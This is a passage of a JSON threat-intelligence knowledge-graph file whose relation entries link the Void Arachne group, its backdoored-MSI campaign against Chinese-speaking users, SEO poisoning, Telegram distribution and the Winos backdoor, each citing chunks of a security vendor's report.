      "type": "LAUNCH",
      "source": "threat-org--void-arachne",
      "target": "attack-event--msi-campaign",
      "confidence": 0.95,
      "evidence": "Void Arachne组织发起了恶意MSI文件攻击活动",
      "chunks_info": [
        {
          "chunk_id": 0,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese  \n**Report highlights:**  \n* We recently discovered a new threat actor group that we dubbed Void Arachne. This group targets Chinese-speaking users with malicious Windows Installer (MSI) files in a recent campaign. These MSI files contain legitimate software installer files for AI software and other popular software but are bundled with malicious Winos payloads.\n* The campaign also promotes compromised MSI files embedded with nudifiers and deepfake pornography-generating software, as well as AI voice and facial technologies.\n* The campaign uses SEO poisoning tactics and social media and messaging platforms to distribute malware.\n* The malware installs a Winos backdoor during the installation process, which could lead to a full system compromise.\n* Due to strict government control in China, VPN services and public interest in this technology have notably increased. And in this Void Arachne campaign, we’ve observed how threat actors are exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nIn early April, we discovered that a new threat actor group (which we call Void Arachne) was targeting Chinese-speaking users. Void Arachne’s campaign involves the use of malicious MSI files that contain legitimate software installer files for [artificial intelligence (AI)](/en_us/business/ai.html) software as well as other popular software. The malicious Winos payloads are bundled alongside nudifiers and deepfake pornography-generating AI software, voice-and-face-swapping AI software, zh-CN (Simplified Chinese) language packs, the simplified Chinese version of Google Chrome, and Chinese-marketed virtual private networks (VPNs), such as LetsVPN and QuickVPN. During the process of installation, a Winos backdoor is also installed, which could also lead to full system compromise.  \nDuring this campaign, we observed numerous malicious installer files being shared across several Telegram channels. We also saw attacker-controlled web servers that distribute malicious files through search engine optimization (SEO) poisoning attacks. These MSI files act as backdoored installers, serving both the non-malicious software and the Winos 4.0 command-and-control (C&C) framework implant, which could lead to a full system compromise. Winos (not to be confused with the Windows operating system) is a backdoor used by Chinese threat actors with an extensive array of capabilities for remotely controlling a compromised computer.",
          "chunk_length": 2545,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese"
            ],
            "content_type": "text",
            "token_length": 519,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "has_full_header_context": true,
            "Header 2": "",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 0,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "ATTACK",
      "source": "attack-event--msi-campaign",
      "target": "target--chinese-users",
      "confidence": 0.95,
      "evidence": "攻击活动针对中文用户",
      "chunks_info": [
        {
          "chunk_id": 0,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese  \n**Report highlights:**  \n* We recently discovered a new threat actor group that we dubbed Void Arachne. This group targets Chinese-speaking users with malicious Windows Installer (MSI) files in a recent campaign. These MSI files contain legitimate software installer files for AI software and other popular software but are bundled with malicious Winos payloads.\n* The campaign also promotes compromised MSI files embedded with nudifiers and deepfake pornography-generating software, as well as AI voice and facial technologies.\n* The campaign uses SEO poisoning tactics and social media and messaging platforms to distribute malware.\n* The malware installs a Winos backdoor during the installation process, which could lead to a full system compromise.\n* Due to strict government control in China, VPN services and public interest in this technology have notably increased. And in this Void Arachne campaign, we’ve observed how threat actors are exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nIn early April, we discovered that a new threat actor group (which we call Void Arachne) was targeting Chinese-speaking users. Void Arachne’s campaign involves the use of malicious MSI files that contain legitimate software installer files for [artificial intelligence (AI)](/en_us/business/ai.html) software as well as other popular software. The malicious Winos payloads are bundled alongside nudifiers and deepfake pornography-generating AI software, voice-and-face-swapping AI software, zh-CN (Simplified Chinese) language packs, the simplified Chinese version of Google Chrome, and Chinese-marketed virtual private networks (VPNs), such as LetsVPN and QuickVPN. During the process of installation, a Winos backdoor is also installed, which could also lead to full system compromise.  \nDuring this campaign, we observed numerous malicious installer files being shared across several Telegram channels. We also saw attacker-controlled web servers that distribute malicious files through search engine optimization (SEO) poisoning attacks. These MSI files act as backdoored installers, serving both the non-malicious software and the Winos 4.0 command-and-control (C&C) framework implant, which could lead to a full system compromise. Winos (not to be confused with the Windows operating system) is a backdoor used by Chinese threat actors with an extensive array of capabilities for remotely controlling a compromised computer.",
          "chunk_length": 2545,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese"
            ],
            "content_type": "text",
            "token_length": 519,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "has_full_header_context": true,
            "Header 2": "",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 0,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "ATTACK",
      "source": "attack-event--msi-campaign",
      "target": "technique--seo-poisoning",
      "confidence": 0.9,
      "evidence": "攻击活动使用SEO投毒技术",
      "chunks_info": [
        {
          "chunk_id": 0,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese  \n**Report highlights:**  \n* We recently discovered a new threat actor group that we dubbed Void Arachne. This group targets Chinese-speaking users with malicious Windows Installer (MSI) files in a recent campaign. These MSI files contain legitimate software installer files for AI software and other popular software but are bundled with malicious Winos payloads.\n* The campaign also promotes compromised MSI files embedded with nudifiers and deepfake pornography-generating software, as well as AI voice and facial technologies.\n* The campaign uses SEO poisoning tactics and social media and messaging platforms to distribute malware.\n* The malware installs a Winos backdoor during the installation process, which could lead to a full system compromise.\n* Due to strict government control in China, VPN services and public interest in this technology have notably increased. And in this Void Arachne campaign, we’ve observed how threat actors are exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nIn early April, we discovered that a new threat actor group (which we call Void Arachne) was targeting Chinese-speaking users. Void Arachne’s campaign involves the use of malicious MSI files that contain legitimate software installer files for [artificial intelligence (AI)](/en_us/business/ai.html) software as well as other popular software. The malicious Winos payloads are bundled alongside nudifiers and deepfake pornography-generating AI software, voice-and-face-swapping AI software, zh-CN (Simplified Chinese) language packs, the simplified Chinese version of Google Chrome, and Chinese-marketed virtual private networks (VPNs), such as LetsVPN and QuickVPN. During the process of installation, a Winos backdoor is also installed, which could also lead to full system compromise.  \nDuring this campaign, we observed numerous malicious installer files being shared across several Telegram channels. We also saw attacker-controlled web servers that distribute malicious files through search engine optimization (SEO) poisoning attacks. These MSI files act as backdoored installers, serving both the non-malicious software and the Winos 4.0 command-and-control (C&C) framework implant, which could lead to a full system compromise. Winos (not to be confused with the Windows operating system) is a backdoor used by Chinese threat actors with an extensive array of capabilities for remotely controlling a compromised computer.",
          "chunk_length": 2545,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese"
            ],
            "content_type": "text",
            "token_length": 519,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "has_full_header_context": true,
            "Header 2": "",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 0,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "ATTACK",
      "source": "attack-event--msi-campaign",
      "target": "technique--social-media-distribution",
      "confidence": 0.9,
      "evidence": "攻击活动通过社交媒体和消息平台分发恶意软件",
      "chunks_info": [
        {
          "chunk_id": 0,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese  \n**Report highlights:**  \n* We recently discovered a new threat actor group that we dubbed Void Arachne. This group targets Chinese-speaking users with malicious Windows Installer (MSI) files in a recent campaign. These MSI files contain legitimate software installer files for AI software and other popular software but are bundled with malicious Winos payloads.\n* The campaign also promotes compromised MSI files embedded with nudifiers and deepfake pornography-generating software, as well as AI voice and facial technologies.\n* The campaign uses SEO poisoning tactics and social media and messaging platforms to distribute malware.\n* The malware installs a Winos backdoor during the installation process, which could lead to a full system compromise.\n* Due to strict government control in China, VPN services and public interest in this technology have notably increased. And in this Void Arachne campaign, we’ve observed how threat actors are exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nIn early April, we discovered that a new threat actor group (which we call Void Arachne) was targeting Chinese-speaking users. Void Arachne’s campaign involves the use of malicious MSI files that contain legitimate software installer files for [artificial intelligence (AI)](/en_us/business/ai.html) software as well as other popular software. The malicious Winos payloads are bundled alongside nudifiers and deepfake pornography-generating AI software, voice-and-face-swapping AI software, zh-CN (Simplified Chinese) language packs, the simplified Chinese version of Google Chrome, and Chinese-marketed virtual private networks (VPNs), such as LetsVPN and QuickVPN. During the process of installation, a Winos backdoor is also installed, which could also lead to full system compromise.  \nDuring this campaign, we observed numerous malicious installer files being shared across several Telegram channels. We also saw attacker-controlled web servers that distribute malicious files through search engine optimization (SEO) poisoning attacks. These MSI files act as backdoored installers, serving both the non-malicious software and the Winos 4.0 command-and-control (C&C) framework implant, which could lead to a full system compromise. Winos (not to be confused with the Windows operating system) is a backdoor used by Chinese threat actors with an extensive array of capabilities for remotely controlling a compromised computer.",
          "chunk_length": 2545,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese"
            ],
            "content_type": "text",
            "token_length": 519,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "has_full_header_context": true,
            "Header 2": "",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 0,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "procedure--backdoor-installation",
      "target": "tool--malicious-msi",
      "confidence": 0.95,
      "evidence": "安装过程使用恶意MSI文件",
      "chunks_info": [
        {
          "chunk_id": 0,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese  \n**Report highlights:**  \n* We recently discovered a new threat actor group that we dubbed Void Arachne. This group targets Chinese-speaking users with malicious Windows Installer (MSI) files in a recent campaign. These MSI files contain legitimate software installer files for AI software and other popular software but are bundled with malicious Winos payloads.\n* The campaign also promotes compromised MSI files embedded with nudifiers and deepfake pornography-generating software, as well as AI voice and facial technologies.\n* The campaign uses SEO poisoning tactics and social media and messaging platforms to distribute malware.\n* The malware installs a Winos backdoor during the installation process, which could lead to a full system compromise.\n* Due to strict government control in China, VPN services and public interest in this technology have notably increased. And in this Void Arachne campaign, we’ve observed how threat actors are exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nIn early April, we discovered that a new threat actor group (which we call Void Arachne) was targeting Chinese-speaking users. Void Arachne’s campaign involves the use of malicious MSI files that contain legitimate software installer files for [artificial intelligence (AI)](/en_us/business/ai.html) software as well as other popular software. The malicious Winos payloads are bundled alongside nudifiers and deepfake pornography-generating AI software, voice-and-face-swapping AI software, zh-CN (Simplified Chinese) language packs, the simplified Chinese version of Google Chrome, and Chinese-marketed virtual private networks (VPNs), such as LetsVPN and QuickVPN. During the process of installation, a Winos backdoor is also installed, which could also lead to full system compromise.  \nDuring this campaign, we observed numerous malicious installer files being shared across several Telegram channels. We also saw attacker-controlled web servers that distribute malicious files through search engine optimization (SEO) poisoning attacks. These MSI files act as backdoored installers, serving both the non-malicious software and the Winos 4.0 command-and-control (C&C) framework implant, which could lead to a full system compromise. Winos (not to be confused with the Windows operating system) is a backdoor used by Chinese threat actors with an extensive array of capabilities for remotely controlling a compromised computer.",
          "chunk_length": 2545,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese"
            ],
            "content_type": "text",
            "token_length": 519,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "has_full_header_context": true,
            "Header 2": "",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 0,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "procedure--backdoor-installation",
      "target": "tool--winos-backdoor",
      "confidence": 0.95,
      "evidence": "安装过程部署Winos后门",
      "chunks_info": [
        {
          "chunk_id": 0,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese  \n**Report highlights:**  \n* We recently discovered a new threat actor group that we dubbed Void Arachne. This group targets Chinese-speaking users with malicious Windows Installer (MSI) files in a recent campaign. These MSI files contain legitimate software installer files for AI software and other popular software but are bundled with malicious Winos payloads.\n* The campaign also promotes compromised MSI files embedded with nudifiers and deepfake pornography-generating software, as well as AI voice and facial technologies.\n* The campaign uses SEO poisoning tactics and social media and messaging platforms to distribute malware.\n* The malware installs a Winos backdoor during the installation process, which could lead to a full system compromise.\n* Due to strict government control in China, VPN services and public interest in this technology have notably increased. And in this Void Arachne campaign, we’ve observed how threat actors are exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nIn early April, we discovered that a new threat actor group (which we call Void Arachne) was targeting Chinese-speaking users. Void Arachne’s campaign involves the use of malicious MSI files that contain legitimate software installer files for [artificial intelligence (AI)](/en_us/business/ai.html) software as well as other popular software. The malicious Winos payloads are bundled alongside nudifiers and deepfake pornography-generating AI software, voice-and-face-swapping AI software, zh-CN (Simplified Chinese) language packs, the simplified Chinese version of Google Chrome, and Chinese-marketed virtual private networks (VPNs), such as LetsVPN and QuickVPN. During the process of installation, a Winos backdoor is also installed, which could also lead to full system compromise.  \nDuring this campaign, we observed numerous malicious installer files being shared across several Telegram channels. We also saw attacker-controlled web servers that distribute malicious files through search engine optimization (SEO) poisoning attacks. These MSI files act as backdoored installers, serving both the non-malicious software and the Winos 4.0 command-and-control (C&C) framework implant, which could lead to a full system compromise. Winos (not to be confused with the Windows operating system) is a backdoor used by Chinese threat actors with an extensive array of capabilities for remotely controlling a compromised computer.",
          "chunk_length": 2545,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese"
            ],
            "content_type": "text",
            "token_length": 519,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "has_full_header_context": true,
            "Header 2": "",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 0,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "asset--telegram-channels",
      "target": "procedure--backdoor-installation",
      "confidence": 0.9,
      "evidence": "Telegram频道用于分发恶意安装文件",
      "chunks_info": [
        {
          "chunk_id": 0,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese  \n**Report highlights:**  \n* We recently discovered a new threat actor group that we dubbed Void Arachne. This group targets Chinese-speaking users with malicious Windows Installer (MSI) files in a recent campaign. These MSI files contain legitimate software installer files for AI software and other popular software but are bundled with malicious Winos payloads.\n* The campaign also promotes compromised MSI files embedded with nudifiers and deepfake pornography-generating software, as well as AI voice and facial technologies.\n* The campaign uses SEO poisoning tactics and social media and messaging platforms to distribute malware.\n* The malware installs a Winos backdoor during the installation process, which could lead to a full system compromise.\n* Due to strict government control in China, VPN services and public interest in this technology have notably increased. And in this Void Arachne campaign, we’ve observed how threat actors are exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nIn early April, we discovered that a new threat actor group (which we call Void Arachne) was targeting Chinese-speaking users. Void Arachne’s campaign involves the use of malicious MSI files that contain legitimate software installer files for [artificial intelligence (AI)](/en_us/business/ai.html) software as well as other popular software. The malicious Winos payloads are bundled alongside nudifiers and deepfake pornography-generating AI software, voice-and-face-swapping AI software, zh-CN (Simplified Chinese) language packs, the simplified Chinese version of Google Chrome, and Chinese-marketed virtual private networks (VPNs), such as LetsVPN and QuickVPN. During the process of installation, a Winos backdoor is also installed, which could also lead to full system compromise.  \nDuring this campaign, we observed numerous malicious installer files being shared across several Telegram channels. We also saw attacker-controlled web servers that distribute malicious files through search engine optimization (SEO) poisoning attacks. These MSI files act as backdoored installers, serving both the non-malicious software and the Winos 4.0 command-and-control (C&C) framework implant, which could lead to a full system compromise. Winos (not to be confused with the Windows operating system) is a backdoor used by Chinese threat actors with an extensive array of capabilities for remotely controlling a compromised computer.",
          "chunk_length": 2545,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese"
            ],
            "content_type": "text",
            "token_length": 519,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "has_full_header_context": true,
            "Header 2": "",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 0,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "asset--web-servers",
      "target": "procedure--backdoor-installation",
      "confidence": 0.9,
      "evidence": "攻击者控制的Web服务器用于分发恶意文件",
      "chunks_info": [
        {
          "chunk_id": 0,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese  \n**Report highlights:**  \n* We recently discovered a new threat actor group that we dubbed Void Arachne. This group targets Chinese-speaking users with malicious Windows Installer (MSI) files in a recent campaign. These MSI files contain legitimate software installer files for AI software and other popular software but are bundled with malicious Winos payloads.\n* The campaign also promotes compromised MSI files embedded with nudifiers and deepfake pornography-generating software, as well as AI voice and facial technologies.\n* The campaign uses SEO poisoning tactics and social media and messaging platforms to distribute malware.\n* The malware installs a Winos backdoor during the installation process, which could lead to a full system compromise.\n* Due to strict government control in China, VPN services and public interest in this technology have notably increased. And in this Void Arachne campaign, we’ve observed how threat actors are exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nIn early April, we discovered that a new threat actor group (which we call Void Arachne) was targeting Chinese-speaking users. Void Arachne’s campaign involves the use of malicious MSI files that contain legitimate software installer files for [artificial intelligence (AI)](/en_us/business/ai.html) software as well as other popular software. The malicious Winos payloads are bundled alongside nudifiers and deepfake pornography-generating AI software, voice-and-face-swapping AI software, zh-CN (Simplified Chinese) language packs, the simplified Chinese version of Google Chrome, and Chinese-marketed virtual private networks (VPNs), such as LetsVPN and QuickVPN. During the process of installation, a Winos backdoor is also installed, which could also lead to full system compromise.  \nDuring this campaign, we observed numerous malicious installer files being shared across several Telegram channels. We also saw attacker-controlled web servers that distribute malicious files through search engine optimization (SEO) poisoning attacks. These MSI files act as backdoored installers, serving both the non-malicious software and the Winos 4.0 command-and-control (C&C) framework implant, which could lead to a full system compromise. Winos (not to be confused with the Windows operating system) is a backdoor used by Chinese threat actors with an extensive array of capabilities for remotely controlling a compromised computer.",
          "chunk_length": 2545,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese"
            ],
            "content_type": "text",
            "token_length": 519,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "has_full_header_context": true,
            "Header 2": "",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 0,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--great-wall",
      "target": "attack-event--multi-vector",
      "confidence": 0.95,
      "evidence": "报告记录了多种初始访问向量的攻击活动",
      "chunks_info": [
        {
          "chunk_id": 1,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n\n## Attack diagram  \nWe observed multiple initial access vectors that the Void Arachne threat actor group uses to distribute malware across the web and through social media platforms. These distribution methods include an infrastructure staged for SEO poisoning and malicious package distribution across Chinese-language-themed Telegram channels.",
          "chunk_length": 399,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Attack diagram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Attack diagram"
            ],
            "content_type": "text",
            "token_length": 56,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 1,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "LAUNCH",
      "source": "threat-org--void-arachne",
      "target": "attack-event--multi-vector",
      "confidence": 0.95,
      "evidence": "Void Arachne组织发起了多种初始访问向量的攻击活动",
      "chunks_info": [
        {
          "chunk_id": 1,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n\n## Attack diagram  \nWe observed multiple initial access vectors that the Void Arachne threat actor group uses to distribute malware across the web and through social media platforms. These distribution methods include an infrastructure staged for SEO poisoning and malicious package distribution across Chinese-language-themed Telegram channels.",
          "chunk_length": 399,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Attack diagram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Attack diagram"
            ],
            "content_type": "text",
            "token_length": 56,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 1,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "ATTACK",
      "source": "attack-event--multi-vector",
      "target": "technique--seo-poisoning",
      "confidence": 0.9,
      "evidence": "攻击活动使用SEO投毒技术",
      "chunks_info": [
        {
          "chunk_id": 1,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n\n## Attack diagram  \nWe observed multiple initial access vectors that the Void Arachne threat actor group uses to distribute malware across the web and through social media platforms. These distribution methods include an infrastructure staged for SEO poisoning and malicious package distribution across Chinese-language-themed Telegram channels.",
          "chunk_length": 399,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Attack diagram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Attack diagram"
            ],
            "content_type": "text",
            "token_length": 56,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 1,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "ATTACK",
      "source": "attack-event--multi-vector",
      "target": "technique--malicious-package",
      "confidence": 0.9,
      "evidence": "攻击活动使用恶意软件包分发技术",
      "chunks_info": [
        {
          "chunk_id": 1,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n\n## Attack diagram  \nWe observed multiple initial access vectors that the Void Arachne threat actor group uses to distribute malware across the web and through social media platforms. These distribution methods include an infrastructure staged for SEO poisoning and malicious package distribution across Chinese-language-themed Telegram channels.",
          "chunk_length": 399,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Attack diagram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Attack diagram"
            ],
            "content_type": "text",
            "token_length": 56,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 1,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "ATTACK",
      "source": "attack-event--multi-vector",
      "target": "target--chinese-users",
      "confidence": 0.95,
      "evidence": "攻击活动针对中文用户",
      "chunks_info": [
        {
          "chunk_id": 1,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n\n## Attack diagram  \nWe observed multiple initial access vectors that the Void Arachne threat actor group uses to distribute malware across the web and through social media platforms. These distribution methods include an infrastructure staged for SEO poisoning and malicious package distribution across Chinese-language-themed Telegram channels.",
          "chunk_length": 399,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Attack diagram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Attack diagram"
            ],
            "content_type": "text",
            "token_length": 56,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 1,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "asset--telegram-channels",
      "target": "technique--malicious-package",
      "confidence": 0.95,
      "evidence": "Telegram频道用于分发恶意软件包",
      "chunks_info": [
        {
          "chunk_id": 1,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n\n## Attack diagram  \nWe observed multiple initial access vectors that the Void Arachne threat actor group uses to distribute malware across the web and through social media platforms. These distribution methods include an infrastructure staged for SEO poisoning and malicious package distribution across Chinese-language-themed Telegram channels.",
          "chunk_length": 399,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Attack diagram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Attack diagram"
            ],
            "content_type": "text",
            "token_length": 56,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 1,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--great-wall",
      "target": "attack-event--initial-access",
      "confidence": 0.95,
      "evidence": "报告记录了初始访问攻击活动",
      "chunks_info": [
        {
          "chunk_id": 2,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n\n## Initial access  \nWe observed multiple initial access vectors that the Void Arachne threat actor group uses to distribute malware across the web and through social media platforms. These distribution methods include an infrastructure staged for SEO poisoning and malicious package distribution across Chinese-language-themed Telegram channels.",
          "chunk_length": 399,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access"
            ],
            "content_type": "text",
            "token_length": 56,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 2,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "LAUNCH",
      "source": "threat-org--void-arachne",
      "target": "attack-event--initial-access",
      "confidence": 0.95,
      "evidence": "Void Arachne组织发起了初始访问攻击活动",
      "chunks_info": [
        {
          "chunk_id": 2,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n\n## Initial access  \nWe observed multiple initial access vectors that the Void Arachne threat actor group uses to distribute malware across the web and through social media platforms. These distribution methods include an infrastructure staged for SEO poisoning and malicious package distribution across Chinese-language-themed Telegram channels.",
          "chunk_length": 399,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access"
            ],
            "content_type": "text",
            "token_length": 56,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 2,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "ATTACK",
      "source": "attack-event--initial-access",
      "target": "target--chinese-users",
      "confidence": 0.95,
      "evidence": "攻击活动针对中文用户",
      "chunks_info": [
        {
          "chunk_id": 2,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n\n## Initial access  \nWe observed multiple initial access vectors that the Void Arachne threat actor group uses to distribute malware across the web and through social media platforms. These distribution methods include an infrastructure staged for SEO poisoning and malicious package distribution across Chinese-language-themed Telegram channels.",
          "chunk_length": 399,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access"
            ],
            "content_type": "text",
            "token_length": 56,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 2,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "ATTACK",
      "source": "attack-event--initial-access",
      "target": "technique--seo-poisoning",
      "confidence": 0.9,
      "evidence": "攻击活动使用SEO投毒技术",
      "chunks_info": [
        {
          "chunk_id": 2,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n\n## Initial access  \nWe observed multiple initial access vectors that the Void Arachne threat actor group uses to distribute malware across the web and through social media platforms. These distribution methods include an infrastructure staged for SEO poisoning and malicious package distribution across Chinese-language-themed Telegram channels.",
          "chunk_length": 399,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access"
            ],
            "content_type": "text",
            "token_length": 56,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 2,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "ATTACK",
      "source": "attack-event--initial-access",
      "target": "technique--malicious-package",
      "confidence": 0.9,
      "evidence": "攻击活动使用恶意软件包分发技术",
      "chunks_info": [
        {
          "chunk_id": 2,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n\n## Initial access  \nWe observed multiple initial access vectors that the Void Arachne threat actor group uses to distribute malware across the web and through social media platforms. These distribution methods include an infrastructure staged for SEO poisoning and malicious package distribution across Chinese-language-themed Telegram channels.",
          "chunk_length": 399,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access"
            ],
            "content_type": "text",
            "token_length": 56,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 2,
            "total_chunks": 37
          }
        }
      ]
    },
